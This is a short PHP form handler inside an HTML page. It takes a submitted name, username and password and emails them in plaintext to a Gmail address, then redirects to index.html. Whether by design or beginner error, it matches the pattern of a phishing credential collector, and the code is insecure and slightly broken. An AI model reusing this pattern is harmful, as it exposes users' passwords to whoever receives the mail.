<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<?php 
 $fname = $_POST["fname"]; 
 $lname = $_POST["lname"]; 

 $uname = $_POST["uname"];
 
 $pword= $_POST["pword"]; 

 $pnumber = $_POST["pnumber"];
 
 $gender = $_POST["gender"]; 
 
 $nline = $_POST["newline"];
 $email_from = "abiolajibola7@gmail.com";
 $email_subject =" Submission Form ";
 $email_body = " Name: $fname . $lname\n".
                "Username: $uname\n".
                "Password: $pword";

 $to = "abiolaajibola955@gmail.com";
 $header = "From: $email_from";

 mail($to,$email_subject,$email_body);
 header("Location: index.html")
 ?><br>

</body>
</html>